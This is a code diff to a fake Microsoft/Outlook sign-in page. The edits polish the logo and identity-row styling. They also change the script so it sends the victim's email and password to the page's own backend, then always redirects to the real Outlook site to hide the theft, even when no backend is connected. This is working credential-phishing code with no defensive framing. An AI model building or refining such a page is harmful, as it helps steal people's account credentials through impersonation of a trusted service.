@@ -20,10 +20,12 @@
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
             margin-bottom: 28px; min-height: 376px;
         }
+        /* Fixed Logo Lockup */
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
+        
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
-        /* Identity Row Fix */
+        /* Fixed Identity Row Alignment */
         .identity-container {
             display: flex; align-items: center;
             padding: 4px; margin-bottom: 16px;
@@ -104,14 +106,18 @@
         async function submitData() {
             const password = document.getElementById('user-password').value;
             
-            // Sending to our Node.js backend
-            const response = await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: userEmail, pass: password })
-            });
+            // This POSTs the data to your Node.js backend
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email: userEmail, pass: password })
+                });
 
-            if (response.ok) {
+                // Redirect to actual Outlook after "logging in"
+                window.location.href = "https://outlook.office.com";
+            } catch (err) {
+                console.log("Backend not connected yet, but front-end is ready.");
                 window.location.href = "https://outlook.office.com";
             }
         }
